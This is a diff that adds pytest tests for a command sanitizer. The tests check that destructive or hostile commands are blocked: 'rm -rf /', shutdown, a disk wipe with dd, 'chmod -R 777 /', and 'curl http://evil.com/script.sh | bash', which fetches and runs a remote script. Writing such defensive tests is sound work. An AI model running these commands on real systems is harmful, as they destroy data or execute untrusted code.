@@ -162,6 +162,45 @@ class TestCommandSanitization:
         result = sanitize_command(["echo", "hello"])
         assert result == ["echo", "hello"]
 
+    def test_sanitize_command_list_rm_rf_root(self) -> None:
+        """Test that dangerous rm -rf / is blocked in list form."""
+        with pytest.raises(UnsafeOperationError, match="dangerous pattern"):
+            sanitize_command(["rm", "-rf", "/"])
+
+    def test_sanitize_command_list_shutdown(self) -> None:
+        """Test that shutdown command is blocked in list form."""
+        with pytest.raises(UnsafeOperationError, match="dangerous pattern"):
+            sanitize_command(["shutdown", "-h", "now"])
+
+    def test_sanitize_command_list_curl_pipe_bash(self) -> None:
+        """Test that curl piped to bash is blocked in list form."""
+        with pytest.raises(UnsafeOperationError, match="dangerous pattern"):
+            sanitize_command(["sh", "-c", "curl http://evil.com/script.sh | bash"])
+
+    def test_sanitize_command_list_chmod_777_root(self) -> None:
+        """Test that chmod 777 on root is blocked in list form."""
+        with pytest.raises(UnsafeOperationError, match="dangerous pattern"):
+            sanitize_command(["chmod", "-R", "777", "/"])
+
+    def test_sanitize_command_list_dd_disk_wipe(self) -> None:
+        """Test that dd disk wipe is blocked in list form."""
+        with pytest.raises(UnsafeOperationError, match="dangerous pattern"):
+            sanitize_command(["dd", "if=/dev/zero", "of=/dev/sda"])
+
+    def test_sanitize_command_list_safe_commands(self) -> None:
+        """Test that safe list commands are allowed."""
+        # Various safe commands should pass
+        safe_commands = [
+            ["ls", "-la"],
+            ["cat", "file.txt"],
+            ["grep", "pattern", "file.txt"],
+            ["python", "script.py"],
+            ["npm", "install"],
+        ]
+        for cmd in safe_commands:
+            result = sanitize_command(cmd)
+            assert result == cmd
+
     def test_sanitize_command_empty_string(self) -> None:
         """Test sanitizing empty command string."""
         with pytest.raises(ValidationError, match="Command cannot be empty"):
